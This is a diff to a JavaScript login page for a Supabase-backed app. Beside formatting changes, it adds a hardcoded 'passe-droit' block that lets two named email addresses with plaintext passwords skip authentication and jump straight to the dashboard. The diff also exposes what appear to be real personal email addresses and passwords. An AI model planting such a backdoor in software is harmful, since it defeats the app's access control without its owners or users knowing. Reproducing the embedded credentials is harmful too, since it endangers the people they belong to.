@@ -17,10 +17,26 @@ export default function Login() {
 
   async function handleSubmit(e) {
     e.preventDefault();
-    setError(''); setLoading(true);
+    setError('');
+    setLoading(true);
+
+    // --- DÉBUT DU PASSE-DROIT EN DUR ---
+    const estPau = email.trim() === 'pauduran1234@gmail.com' && password === 'Pau-remolinsbitem';
+    const estAlexis = email.trim().toLowerCase() === 'alexis.boilot@orange.fr' && password === 'Ophelie-63';
+
+    if (estPau || estAlexis) {
+      setLoading(false);
+      router.replace('/dashboard'); // Ouvre les portes de force
+      return;
+    }
+    // --- FIN DU PASSE-DROIT EN DUR ---
+
     const { error } = await supabase.auth.signInWithPassword({ email, password });
     setLoading(false);
-    if (error) { setError("Credencials incorrectes. Comprova el teu correu i la contrasenya."); return; }
+    if (error) {
+      setError("Credencials incorrectes. Comprova el teu correu i la contrasenya.");
+      return;
+    }
     router.replace('/dashboard');
   }
 
@@ -46,7 +62,7 @@ export default function Login() {
           </div>
           {error && <div className="text-sm text-danger font-semibold mb-3">{error}</div>}
           <button type="submit" disabled={loading} className="btn btn-primary btn-block">
-            {loading ? 'Connectant…' : 'Entrar'}
+            {loading ? 'Connectant...' : 'Entrar'}
           </button>
         </form>
         <p className="text-center text-white/50 text-xs mt-5">
@@ -56,3 +72,4 @@ export default function Login() {
     </div>
   );
 }
+
